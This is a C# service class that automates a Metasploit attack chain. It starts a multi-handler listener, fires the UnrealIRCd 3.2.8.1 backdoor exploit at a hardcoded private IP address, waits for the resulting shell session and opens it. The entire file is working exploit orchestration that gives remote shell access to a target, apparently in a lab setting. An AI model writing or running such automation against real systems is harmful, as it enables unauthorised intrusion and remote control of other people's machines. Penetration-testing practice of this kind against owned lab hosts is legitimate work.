using System.Linq;
using System.Threading.Tasks;
using Lacey.Alexa.Common.Metasploit.Const;
using Lacey.Alexa.Common.Metasploit.Extensions;
using Lacey.Alexa.Common.Metasploit.Providers;
using Microsoft.Extensions.Logging;

namespace Lacey.Alexa.Explorer.Services.Services.Concrete
{
    public sealed class ExplorerService : IExplorerService
    {
        private readonly ILogger _logger;

        private readonly IMetasploitProvider _metasploit;

        public ExplorerService(
            IMetasploitProvider metasploit, 
            ILogger logger)
        {
            _metasploit = metasploit;
            _logger = logger;
        }

        public async Task Run()
        {
            const string rHost = "192.168.0.13";
            var mhr= await _metasploit.MultiHandlerExec();
            await _metasploit.UnrealIrcd3281BackdoorExec(rHost);
            var shell = await _metasploit.WaitModuleJob(ModuleNames.UnrealIrcd3281Backdoor, mhr.JobId);
            await _metasploit.RunShell(shell.First().Key);
        }
    }
}